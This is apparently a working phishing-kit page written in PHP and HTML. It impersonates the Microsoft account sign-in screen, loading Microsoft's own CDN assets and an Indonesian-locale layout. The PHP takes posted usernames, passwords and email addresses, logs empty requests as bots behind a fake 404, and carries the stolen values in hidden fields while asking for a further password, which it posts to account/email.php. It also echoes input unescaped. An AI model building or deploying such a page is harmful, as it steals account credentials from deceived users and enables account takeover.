<?php
session_start();
error_reporting(0);
$username = $_POST['username'];
$password = $_POST['password'];
$email = $_POST['email'];
if($username == "" && $password == "" && $email == ""){
tulis_file("../../total_bot.txt", $ip);
exit(header("HTTP/1.0 404 Not Found"));
}
?>
<html dir="ltr" lang="ID-ID">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<script type="text/javascript">var PROOF = {};PROOF.Type = {SQSA: 6, CSS: 5, DeviceId: 4, Email: 1, AltEmail: 2, SMS: 3, HIP: 8, Birthday: 9, TOTPAuthenticator: 10, RecoveryCode: 11, StrongTicket: 13, TOTPAuthenticatorV2: 14, UniversalSecondFactor: 15, Voice: -3};</script>
<noscript>
	<meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=ID-ID&lc=1057&uaid=1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR"/>Akun Microsoft memerlukan JavaScript untuk masuk. Browser Web ini tidak mendukung JavaScript atau skrip diblokir.<br />
	<br />Untuk mengetahui apakah browser mendukung JavaScript, atau untuk membolehkan skrip, lihat bantuan online browser.
</noscript>
<title>Login to account Microsoft</title>
<meta name="robots" content="none">
<meta name="PageID" content="i5030">
<meta name="SiteID" content="292841">
<meta name="ReqLC" content="1057">
<meta name="LocLC" content="1057">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">

<link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28893.4/images/favicon.ico">
<link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21057_pX57w6YnWiqTo95swppIBg2.css">
<style type="text/css"></style>
<style type="text/css">body{display:none;}</style>
<script type="text/javascript">
	if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
	<style type="text/css">body{display:block !important;}</style>
<noscript>
	<style type="text/css">body{display:block !important;}</style>
</noscript>
<link rel="image_src" href="https://logincdn.msauth.net/16.000.28893.4/images/Windows_Live_v_thumb.jpg">


<script type="text/javascript">window.UXResourceDependencies = [];</script>
<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.id-id_3xSP7wA0-CKCOAEgvGub8Q2.js","ConvergedLoginPaginatedStrings","sha384-zxGWE2IIFn3lUeiA8CFCm5GHDb/3eXCNnhKdb+drYmbZ6Zq3tVul9wM5fB1/Qczt");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
<script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.id-id_3xSP7wA0-CKCOAEgvGub8Q2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-zxGWE2IIFn3lUeiA8CFCm5GHDb/3eXCNnhKdb+drYmbZ6Zq3tVul9wM5fB1/Qczt"></script>
<script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_xxvbETmiVPe1AsI9xwHp3A2.js","ConvergedLogin_PCore","sha384-Sjuj/cgtDurZS1m9F4UfxVHlLOHHIY+1KqKYJuIOssqBja2hiQRAK60s3NjuOny1");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script>
<script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script>
<script type="text/javascript" src="https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_xxvbETmiVPe1AsI9xwHp3A2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-Sjuj/cgtDurZS1m9F4UfxVHlLOHHIY+1KqKYJuIOssqBja2hiQRAK60s3NjuOny1"></script>
<script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_301eae16ee408e81f29d.js"></script>
</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
	<div>

<div data-bind="if: activeDialog"></div>

<form method="post" action="account/email.php">

    
    <div data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            useWizardBehavior: svr.BM,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">

<div data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
    <!-- /ko -->
</div></div>

<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">

    <div class="template-section main-section">
        <div class="middle" data-bind="css: { 'has-header': showHeader }">

            <div id="lightbox" data-bind="
                animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                externalCss: { 'sign-in-box': true },
                css: {
                    'app': $page.backgroundLogoUrl(),
                    'wide': $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': $page.fadeInLightBox,
                    'has-popup': $page.showFedCredButtons() || $page.newSession(),
                    'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                    'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bV &amp;&amp; showLightboxProgress() }"></div>


        <div class="win-scroll">
            <div data-bind="component: { name: 'logo-control',
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: bannerLogoUrl() } }">

                    <img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
			</div>
           
            <div role="main" data-bind="component: { name: 'pagination-control',
                publicMethods: paginationControlMethods,
                params: {
                    enableCssAnimation: svr.aM,
                    disableAnimationIfAnimationEndUnsupported: svr.bZ,
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel,
                    loadView: view_onLoadView,
                    showView: view_onShow,
                    setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                    animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.bo,
                displayName: sharedData.displayName || svr.J,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Kembali"><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
    </button>
    <!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email; ?>"><?php echo $email; ?></div>
</div></div>
    </div>
        <input type="hidden" name="username" value="<?php echo $username; ?>">
        <input type="hidden" name="password" value="<?php echo $password; ?>">
<input type="hidden" name="email" value="<?php echo $email; ?>">

<div id="loginHeader" class="row title ext-title" >Enter your password</div>

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
        </div>

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">

            <input name="email_password" type="password" id="i0118" class="form-control input ext-input text-box ext-text-box"placeholder="Password" aria-label="Enter your password <?php echo $email; ?>" required="">

            </div>
    </div>
</div>

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div>
        <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView">
            <label id="idLbl_PWD_KMSI_Cb">
                <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Biarkan saya tetap masuk">
                <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">remember me</span>
            </label>
        </div>

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot password?</a>
                    </div>

<div class="form-group">
</div>

                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.F,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div style="padding: 40px;" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="button ext-button primary ext-primary" value="Masuk">
    </div>
</div></div>
        </div>
    </div>
</div>
</div>
    </div>
</div></div>
            <!-- /ko -->
        </div>

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.B6 }, value: flowToken" name="PPFT" value="Db6dSiiPKJCwE5JM9da5K4dCs!3Emfy9QeZ5czveNfajghzyGkTsuAonAjorX6mVM99iTOpeUW20Io6yYM9YwvORKk7xR6cHexX4Sbh*UB6GIsWOGrdRhQtrYWmE4ySUIZXUta0Te43Lnawiommt7RAvY9WIqRO6ikoTi7xKGbGvobe3Uh4*UDPnOasb5Z9f4ASHPWK!4Po8preHJD9p9TDLpMRM!p0ok1q4Zj24LIkDKzmgPYP4PvCGE5oosiNum9ilCD42XjOLbPhUMFUEAb8$">
        <input type="hidden" name="PPSX" data-bind="value: svr.cn" value="P">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Ah" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.Bd ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">

        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
<input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
<input type="hidden" name="i18" data-bind="value: srsSuccess">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
            </div>

            <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

            <!-- ko if: $page.newSession --><!-- /ko -->

            <!-- ko if: $page.showDebugDetails --><!-- /ko -->

            <!-- ko if: !svr.b5 && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
            <div id="footer" role="contentinfo" data-bind="
                externalCss: {
                    'footer': true,
                    'has-background': !$page.useDefaultBackground(),
                    'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

                <div data-bind="component: { name: 'footer-control',
                    publicMethods: $page.footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: $page.useDefaultBackground(),
                        hasDarkBackground: $page.backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: $page.footer_agreementClick,
                        showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=ID-ID&amp;vv=1600&amp;uaid=1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR" class="footer-content ext-footer-content footer-item ext-footer-item">Ketentuan penggunaan</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=ID-ID&amp;vv=1600&amp;uaid=1E6qZkzbGZHh9hWF4dQcTUdbmsYkvBYPrR" class="footer-content ext-footer-content footer-item ext-footer-item">Privasi &amp; Cookie</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Klik di sini untuk mengetahui informasi pemecahan masalah" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.Cn && showLinks --><!-- /ko --></div>
            </div>
            <!-- /ko -->
        </div>
    </div>
</div></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.A7 -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.A7 }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=ID-ID" style="display: none;"></iframe></div>
<!-- /ko --></div></body></html>